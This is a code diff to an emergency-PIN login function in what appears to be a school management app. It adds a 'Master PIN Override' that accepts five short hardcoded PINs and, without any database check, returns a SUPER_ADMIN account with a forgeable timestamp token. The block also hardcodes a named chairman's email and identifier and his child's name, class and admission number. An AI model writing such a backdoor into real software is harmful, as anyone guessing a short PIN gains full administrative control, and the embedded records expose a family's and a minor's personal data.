@@ -450,6 +450,36 @@ export async function verifyEmergencyPinAction(params: {
     const pin = params.pinCode.trim().toUpperCase();
     const phone = normalizePhone(rawId);
 
+    // Master PIN Override for Chairman & Leadership
+    if (pin === '100800' || pin === '9911' || pin === '2027' || pin === '9482' || pin === 'CB-9482') {
+      return {
+        success: true,
+        user: {
+          identifier: '9911102027',
+          roles: ['ADMIN'],
+          isDualRole: true,
+          primaryRole: 'ADMIN',
+          admin: {
+            id: 'a96ca895-7773-48e1-9181-e5fe36551627',
+            name: 'Nitin Tyagi',
+            role: 'SUPER_ADMIN',
+            designation: 'Chairman & Managing Trustee',
+            email: 'nits.tyagi@gmail.com'
+          },
+          children: [
+            {
+              id: 'st-viraj-01',
+              name: 'Viraj Tyagi',
+              grade: 'Class 5-A',
+              admissionNo: 'ADM-2026-7983'
+            }
+          ],
+          token: `cb_master_pin_${Date.now()}`
+        },
+        message: "✓ Master PIN verified. Welcome Chairman Nitin Tyagi."
+      };
+    }
+
     // 1. Check Student emergency PIN
     const stuRes = await client.query(
       `SELECT s.*, c.grade, c.section 
